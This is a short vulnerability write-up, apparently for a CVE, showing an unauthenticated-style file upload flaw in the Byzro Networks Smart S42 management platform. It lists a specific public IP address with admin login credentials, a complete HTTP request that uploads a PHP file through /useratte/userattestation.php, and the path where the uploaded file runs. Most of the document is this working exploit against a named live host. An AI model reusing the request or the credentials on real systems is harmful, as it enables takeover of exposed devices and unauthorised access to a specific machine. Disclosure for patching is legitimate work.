There is a file upload vulnerability in Byzro Networks Smart S42 management platform

version:S42

Vulnerability location：/useratte/userattestation.php

Vulnerability recurrence

IP: https://113.9.192.214:8443/
1. The login interface is as shown in the figure.
 admin/zj40245917

![image](https://github.com/Sadw11v/cve/assets/130206491/9a361370-6cb0-4590-beb7-69564600d40c)

2. Construct a POC and directly upload the 1.php file.
POC
```
POST /useratte/userattestation.php HTTP/1.1
Host: 113.9.192.214:8443
Cookie: PHPSESSID=2174712c6aeda51c4fb6e6c5e6aaac50
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 592
Origin: https://113.9.192.214:8443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328?
```
![image](https://github.com/Sadw11v/cve/assets/130206491/a596f778-cc88-4000-8ae6-1713c1cdfb14)

3. Visit /boot/web/upload/weblogo/1.php
![image](https://github.com/Sadw11v/cve/assets/130206491/5db06aca-562f-40aa-bad7-8103a3afcac2)

   
